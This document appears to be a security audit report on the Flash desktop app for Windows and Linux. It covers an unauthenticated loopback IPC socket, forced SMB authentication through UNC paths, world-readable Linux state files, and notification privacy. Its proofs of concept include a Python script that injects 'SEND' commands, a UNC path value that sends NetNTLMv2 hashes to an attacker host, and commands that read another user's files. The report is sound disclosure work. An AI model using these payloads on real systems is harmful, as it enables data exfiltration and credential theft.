# Domain D12 — Desktop Windows/Linux Application

## 1. Domain Overview
Domain D12 audits the desktop implementation of Flash for Windows and Linux (Kotlin Multiplatform / Compose Desktop JVM). This includes the single-instance IPC mechanism (`SingleInstanceController`), Windows Explorer shell context menu integration (`WindowsContextMenuManager`), Windows startup registration (`DesktopAutoStartManager`), Linux path and filesystem permissions (`DesktopPaths`), identity/trust at-rest storage (`DesktopIdentityStores`, `DesktopVaults`), native library loading, and desktop notification security (`DesktopNotificationManager`).

Audited commit: `75eda19b018948c00947bc08d7288c2d3a0ae6ce`

Files examined:
- `desktop/src/jvmMain/kotlin/com/transfer/flash/desktop/SingleInstanceController.kt`
- `desktop/src/jvmMain/kotlin/com/transfer/flash/desktop/WindowsContextMenuManager.kt`
- `desktop/src/jvmMain/kotlin/com/transfer/flash/desktop/DesktopAutoStartManager.kt`
- `desktop/src/jvmMain/kotlin/com/transfer/flash/desktop/DesktopPaths.kt`
- `desktop/src/jvmMain/kotlin/com/transfer/flash/desktop/DesktopMain.kt`
- `desktop/src/jvmMain/kotlin/com/transfer/flash/desktop/DesktopEngine.kt`
- `desktop/src/jvmMain/kotlin/com/transfer/flash/desktop/DesktopIdentityStores.kt`
- `desktop/src/jvmMain/kotlin/com/transfer/flash/desktop/DesktopVaults.kt`
- `desktop/src/jvmMain/kotlin/com/transfer/flash/desktop/DesktopSettingsStore.kt`
- `desktop/src/jvmMain/kotlin/com/transfer/flash/desktop/DesktopNotificationManager.kt`
- `desktop/build.gradle.kts`
- `core/security/src/jvmMain/kotlin/com/transfer/flash/core/security/identity/KeyFileVault.kt`
- `core/engine/src/commonMain/kotlin/com/transfer/flash/core/engine/FlashPathSanitizer.kt`

---

## 2. Findings Ledger

| ID | Title | Severity | CWE | CVSS v3.1 | Attacker Model | Status |
|---|---|---|---|---|---|---|
| `SEC-D12-01` | Unauthenticated loopback IPC socket in `SingleInstanceController` allows local process to stage arbitrary files and hijack UI focus | Medium | CWE-306 | 5.5 | A6 | CONFIRMED |
| `SEC-D12-02` | `SingleInstanceController` processes UNC paths without restriction, leaking NetNTLMv2 hashes to remote SMB hosts | Medium | CWE-610 | 5.5 | A6, A5 | CONFIRMED |
| `SEC-D12-03` | World-readable application state directory, settings, and logs on multi-user Linux workstations | Medium | CWE-276 | 5.5 | A6, A7 | CONFIRMED |
| `SEC-D12-04` | Desktop notification manager exposes full plaintext message body and sender identities to lock screen / screen shares | Low | CWE-359 | 3.3 | A6 | CONFIRMED |

---

## 3. Detailed Findings

### SEC-D12-01: Unauthenticated Loopback IPC Socket in `SingleInstanceController`
- **File & Line:** `desktop/src/jvmMain/kotlin/com/transfer/flash/desktop/SingleInstanceController.kt:139-189`
- **Attacker Model:** A6 (Other app or other local user on the same device)
- **CWE:** CWE-306: Missing Authentication for Critical Function / CWE-284: Improper Access Control
- **CVSS v3.1 Score:** 5.5 (`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L`)
- **Vulnerability Description:**
  `SingleInstanceController` ensures only one instance of Flash runs by binding a TCP `ServerSocket` to `127.0.0.1` on an ephemeral port and writing the chosen port to `~/.flash/app.port`. When a second process or command-line invocation starts, it reads `app.port` and connects to the loopback socket to forward file paths (`SEND <path>`) or bring the application window to the foreground (`ACTIVATE`).
  However, the loopback socket listener enforces **zero authentication, authorization tokens, or session secrets**. Any local process or sandboxed application running on the same machine can read `app.port` (or scan loopback ports) and issue `SEND <path>` commands. The listener verifies only that `File(path).exists()`, immediately triggers `onShareFiles(listOf(file))`, places the file into the active user's send tray / queue, and activates the window.
- **Proof of Concept:**
  1. Flash Desktop is running under User Alice.
  2. A low-privilege script or malicious local app runs:
     ```python
     import socket
     with open(r"C:\Users\Alice\.flash\app.port", "r") as f:
         port = int(f.read().strip())
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(("127.0.0.1", port))
     s.sendall(b"SEND C:\\Users\\Alice\\Documents\\Confidential.pdf\n")
     s.close()
     ```
  3. Flash Desktop immediately pulls `Confidential.pdf` into the sharing tray for the currently selected peer and brings the window to the front. If the user clicks send, the confidential document is transmitted.
- **Guard Analysis:** No guards or authentication checks exist. `SingleInstanceController` accepts any raw TCP connection on loopback.
- **Remediation:**
  Generate a cryptographically random authorization cookie (e.g. 32 bytes hex) when creating the single instance lock, write it with owner-only permissions (`0600`) to `~/.flash/app.token`, and require incoming TCP connections to authenticate with `AUTH <token>` before accepting any `SEND` or `ACTIVATE` commands. Reject connections that fail authentication and close the socket immediately.

---

### SEC-D12-02: `SingleInstanceController` UNC Path Handling Triggers Forced SMB Authentication
- **File & Line:** `desktop/src/jvmMain/kotlin/com/transfer/flash/desktop/SingleInstanceController.kt:177-183`
- **Attacker Model:** A6 (Other app or other local user on the same device) / A5 (Network attacker)
- **CWE:** CWE-610: Externally Controlled Reference to a Resource in Another Sphere / CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
- **CVSS v3.1 Score:** 5.5 (`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`)
- **Vulnerability Description:**
  In `SingleInstanceController.kt`, when a `SEND <path>` line is received from the loopback socket, the server executes:
  ```kotlin
  val path = line.removePrefix("SEND ").trim()
  if (path.isNotEmpty()) {
      val file = File(path)
      if (file.exists()) {
          onShareFiles(listOf(file))
      }
  }
  ```
  On Windows systems, if `path` is a Universal Naming Convention (UNC) path (e.g., `\\192.168.1.50\share\file.txt`), calling `file.exists()` instructs the Windows kernel to establish an SMB session with the target host (`192.168.1.50`) on port 445. As part of SMB protocol negotiation, Windows automatically sends the current user's NetNTLMv2 challenge-response hash.
- **Proof of Concept:**
  An unprivileged local process sends:
  `SEND \\10.0.0.99\share\probe.txt`
  Flash Desktop calls `File("\\\\10.0.0.99\\share\\probe.txt").exists()`. The Windows OS immediately initiates an SMB handshake to `10.0.0.99:445`, allowing an adversary running `responder` or `smbserver.py` on `10.0.0.99` to capture the user's NetNTLMv2 hash.
- **Guard Analysis:** No validation exists to check if `path` begins with `\\` or `//` or refers to remote network shares.
- **Remediation:**
  Sanitize and restrict input paths in `SingleInstanceController`:
  Reject any path starting with `\\`, `//`, or containing URI scheme prefixes before invoking `File(path).exists()`. Ensure paths resolve strictly to local drive letters (`[A-Za-z]:\\`) on Windows and absolute POSIX paths on Linux.

---

### SEC-D12-03: World-Readable Application State Directory and Logs on Multi-User Linux Workstations
- **File & Line:** `desktop/src/jvmMain/kotlin/com/transfer/flash/desktop/DesktopPaths.kt:21-35`, `desktop/src/jvmMain/kotlin/com/transfer/flash/desktop/DesktopMain.kt:520-532`, `desktop/src/jvmMain/kotlin/com/transfer/flash/desktop/DesktopIdentityStores.kt:37-54`, `desktop/src/jvmMain/kotlin/com/transfer/flash/desktop/DesktopSettingsStore.kt:63-80`
- **Attacker Model:** A6 (Other app or other local user on the same device) / A7 (Forensic examiner / local user)
- **CWE:** CWE-276: Incorrect Default Permissions / CWE-532: Insertion of Sensitive Information into Log File
- **CVSS v3.1 Score:** 5.5 (`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`)
- **Vulnerability Description:**
  On Linux, `DesktopPaths.stateDir()` resolves to `~/.local/share/flash` or `~/.flash`. Directory creation is performed via `stateDir.mkdirs()` in `DesktopIdentityStores.kt:41`, `DesktopSettingsStore.kt:69`, and `DesktopMain.kt:522`.
  Because standard Java `File.mkdirs()` and `FileWriter` rely on the OS default process umask (commonly `0022`), directories are created with permissions `0755` (`rwxr-xr-x`) and created files (`desktop.log`, `identity.properties`, `settings.properties`, `trust.properties`) are assigned permissions `0644` (`rw-r--r--`).
  `desktop.log` logs verbose runtime events: IP addresses, open listening ports, peer device IDs, group join tokens, signalling metadata, WebRTC connection statistics, and transferred file names. On multi-user Linux workstations, any user with local access can read these files.
- **Proof of Concept:**
  On a shared Linux machine with users Alice and Bob:
  1. Alice runs Flash Desktop.
  2. Bob runs:
     `cat /home/alice/.local/share/flash/desktop.log`
     `cat /home/alice/.local/share/flash/trust.properties`
  3. Bob reads all network endpoints, peer identities, and transfer metadata.
- **Guard Analysis:** While `KeyFileVault.kt:81-90` creates the master key file with owner-only POSIX permissions (`0600`), this protection was not extended to `stateDir`, `desktop.log`, `trust.properties`, or `settings.properties`.
- **Remediation:**
  In `DesktopPaths.stateDir()` and `installDesktopLogSink()`, create directories and files using `java.nio.file.Files.createDirectories` and `createFile` with `PosixFilePermissions.asFileAttribute(setOf(OWNER_READ, OWNER_WRITE, OWNER_EXECUTE))` when operating on POSIX platforms.

---

### SEC-D12-04: Desktop Notification Manager Exposes Full Plaintext Message Body to Screen and Notification History
- **File & Line:** `desktop/src/jvmMain/kotlin/com/transfer/flash/desktop/DesktopNotificationManager.kt:130-152`
- **Attacker Model:** A6 (Local shoulder surfer, screen recording / screen sharing software)
- **CWE:** CWE-359: Exposure of Private Personal Information to an Unauthorized Actor
- **CVSS v3.1 Score:** 3.3 (`CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N`)
- **Vulnerability Description:**
  `DesktopNotificationManager.handleInboundMessage()` sends the complete sender name, group title, and message body directly to the system notification dispatcher (`SystemTray` on Windows, FreeDesktop notification service on Linux).
  On desktop platforms, notifications remain visible on screen for several seconds, appear on lock screens (unless globally disabled in OS settings), and are recorded in the Windows Action Center / desktop notification center. During presentations or video calls, incoming message previews are broadcast to screen-sharing viewers. Furthermore, unlike Android, there is no setting to toggle "Show message preview" vs "Hide message content".
- **Proof of Concept:**
  User Alice shares her screen in a group call or conference. A peer sends a confidential message. Flash immediately displays a notification popup in the bottom right corner with the full text `Boss: Please do not mention the acquisition to anyone`. All conference participants view the message.
- **Guard Analysis:** `handleInboundMessage()` checks `isNotificationsEnabled()`, but does not provide content obfuscation or a privacy mask mode.
- **Remediation:**
  Add a desktop preference `notificationContentPreview` (defaulting to obscured or configurable between `Full`, `SenderOnly`, `None`), formatting the notification body as `New message received` when privacy mode is enabled.

---

## 4. Refuted / Rejected Hypotheses

### REJ-D12-01: Windows Explorer Context Menu Argument Injection via `%1`
- **Hypothesis:** An attacker could craft a malicious filename containing command injection characters or quotes to escape the `%1` argument in the Windows registry handler (`HKCU\Software\Classes\*\shell\Flash\command`).
- **Refutation:** Windows Explorer passes the selected file path to the command handler enclosed in double quotes. Windows NTFS and FAT32 file systems enforce strict character blacklists at the kernel level; double quotes (`"`) cannot be present in file or directory names on Windows. Furthermore, `WindowsContextMenuManager.kt:165` quotes both the arguments file and `%1` (`"\"$javaw\" \"@${argsFile.absolutePath}\" \"%1\""`), preventing argument splitting.

### REJ-D12-02: Desktop Path Traversal via Windows Reserved Device Names
- **Hypothesis:** Inbound transfers on desktop could exploit Windows reserved device names (`CON`, `PRN`, `AUX`, `NUL`, `COM1`..`COM9`) to write directly to DOS device streams or crash the JVM process.
- **Refutation:** `FlashPathSanitizer.kt:17-23,76-81` comprehensively identifies Windows device names (including trailing spaces and extensions like `CON.txt` or `aux .dat`, as well as superscript numbers `COM¹`) and prefixes them with an underscore (`_CON.txt`), neutralizing any device namespace collision before writing.

### REJ-D12-03: Plaintext Session and Identity Key Persistence in Desktop State Directory
- **Hypothesis:** Desktop session keys and identity private keys are persisted as unencrypted plaintext in `trust.properties` or `identity.properties`.
- **Refutation:** While properties files themselves are world-readable on Linux (`SEC-D12-03`), session keys stored in `trust.properties` are encrypted with `vault.seal()` using DPAPI on Windows and the Secret Service keyring / `0600` master key on Linux (`DesktopIdentityStores.kt:124,160-175`). Plaintext keys are rejected and migrated to sealed blobs.
